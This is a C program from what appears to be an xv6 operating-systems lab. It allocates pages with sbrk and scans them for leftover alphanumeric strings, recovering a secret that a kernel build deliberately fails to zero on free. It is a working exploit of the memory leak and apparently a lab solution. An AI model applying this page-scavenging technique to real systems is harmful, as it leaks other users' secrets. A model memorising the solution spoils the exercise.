// user/attack.c
// Find the secret left in freed pages due to missing memset in this lab build.

#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

#define PGSZ 4096
#define MAX_SECRET 512
#define MAX_PAGES 2000

static int
isalnum_char(char c) {
  if (c >= '0' && c <= '9') return 1;
  if (c >= 'A' && c <= 'Z') return 1;
  if (c >= 'a' && c <= 'z') return 1;
  return 0;
}

int
main(int argc, char *argv[])
{
  char best[MAX_SECRET+1];
  int bestlen = 0;

  // zero best for safety
  for (int i = 0; i <= MAX_SECRET; i++) best[i] = 0;

  // Try to allocate many pages and scan them
  for (int p = 0; p < MAX_PAGES; p++) {
    char *page = sbrk(PGSZ);
    if (page == (char*)-1)
      break;

    // scan the page for alphanumeric runs
    int i = 0;
    while (i < PGSZ) {
      // skip non-alnum
      while (i < PGSZ && !isalnum_char(page[i])) i++;
      if (i >= PGSZ) break;
      // start of run
      int j = i;
      int len = 0;
      while (j < PGSZ && isalnum_char(page[j]) && len < MAX_SECRET) {
        len++;
        j++;
      }
      // update best if this run is longer
      if (len > bestlen) {
        if (len > MAX_SECRET) len = MAX_SECRET;
        // copy
        for (int k = 0; k < len; k++) best[k] = page[i+k];
        best[len] = '\0';
        bestlen = len;
        // If we found a reasonably long string, we can print immediately.
        // But to be conservative, we continue scanning to possibly find longer one.
      }
      i = j;
    }

    // small optimization: if we've found a reasonably long candidate, stop early
    // (secret lengths in tests are typically small, but we use threshold 4)
    if (bestlen >= 4)
      break;
  }

  if (bestlen > 0) {
    printf("%s\n", best);
    exit(0);
  }
  exit(1);
}
